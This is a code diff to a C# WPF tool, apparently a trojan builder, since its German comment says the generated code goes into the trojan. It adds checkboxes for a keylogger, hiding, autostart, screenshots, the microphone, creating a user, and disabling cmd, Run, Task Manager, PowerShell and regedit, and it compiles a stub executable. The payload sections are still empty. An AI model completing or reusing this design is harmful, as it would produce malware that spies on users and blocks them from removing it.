@@ -324,10 +324,26 @@ namespace DNAV_GUI
 
         private void Compile_Click(object sender, MouseButtonEventArgs e)
         {
+            string keyloggerHideCode = "";
+            string autostartCode = "";
+            string screenshotCode = "";
+            string cmdCode = "";
+            string runCode = "";
+            string taskmanagerCode = "";
+            string windowskeyCode = "";
+            string powershellCode = "";
+            string regeditCode = "";
+            string createUserCode = "";
+
+
             bool useSystemDiagnostics = false;
             bool useSystemRuntimeInteropServices = false;
             bool useSystemWindowsForms = false;
             bool useSystemIO = false;
+            bool useMicrosoftWin32 = false;
+            bool useSystemDrawing = false;
+            bool useSystemDrawingImaging = false;
+            bool useSystemDirectoryServices = false;
 
             // Anmerkung: Muss mit == true abgefragt werden, da Rückgabetyp von IsChecked vom Typ bool? ist
             if (keyloggerCheckbox.IsChecked == true)
@@ -338,6 +354,70 @@ namespace DNAV_GUI
                 useSystemIO = true;
             }
 
+            if (hideCheckbox.IsChecked == true)
+            {
+                useSystemDiagnostics = true;
+                useSystemRuntimeInteropServices = true;
+                useSystemWindowsForms = true;
+                useSystemIO = true;
+            }
+
+            if (autostartCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+                useSystemWindowsForms = true;
+                useSystemIO = true;
+            }
+
+            if (microphoneCheckbox.IsChecked == true)
+            {
+                
+            }
+
+            if (screenshotCheckbox.IsChecked == true)
+            {
+                useSystemRuntimeInteropServices = true;
+                useSystemDrawing = true;
+                useSystemDrawingImaging = true;
+            }
+
+            if (cmdCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+            }
+
+            if (runCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+            }
+
+            if (taskmanagerCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+            }
+
+            if (windowskeyCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+            }
+
+            if (powershellCheckbox.IsChecked == true)
+            {
+                useSystemDiagnostics = true;
+                useSystemIO = true;
+                useMicrosoftWin32 = true;
+            }
+
+            if (regeditCheckbox.IsChecked == true)
+            {
+                useMicrosoftWin32 = true;
+            }
+
+            if (createUserCheckbox.IsChecked == true)
+            {
+                useSystemDirectoryServices = true;
+            }
+
             CSharpCodeProvider provider = new CSharpCodeProvider();
             CompilerParameters parameters = new CompilerParameters();
 
@@ -345,7 +425,7 @@ namespace DNAV_GUI
             parameters.GenerateExecutable = true;
             parameters.OutputAssembly = path;
 
-            string code = "using System;";
+            string code = "using System;using System.Threading;";
 
             if (useSystemDiagnostics)
                 code += "using System.Diagnostics;";
@@ -355,15 +435,28 @@ namespace DNAV_GUI
                 code += "using System.Windows.Forms;";
             if (useSystemIO)
                 code += "using System.IO;";
+            if (useMicrosoftWin32)
+                code += "using Microsoft.Win32;";
+            if (useSystemDrawing)
+                code += "using System.Drawing;";
+            if (useSystemDrawingImaging)
+                code += "using System.Drawing.Imaging;";
+            if (useSystemDirectoryServices)
+                code += "using System.DirectoryServices;";
 
             code += "namespace " + nameTextBox.Text + "{";
             code += "class Program{";
             code += "static void Main(){";
             code += "Console.Title = \"" + nameTextBox.Text + "\";";
+
             // Debug:
             code += "Console.WriteLine(\"Hallo Welt\");Console.ReadLine();";
             // Hier landet Code, welcher in den Trojaner soll.
 
+            if (keyloggerCheckbox.IsChecked == true)
+            {
+                
+            }
 
             code += "}";
             code += "}";
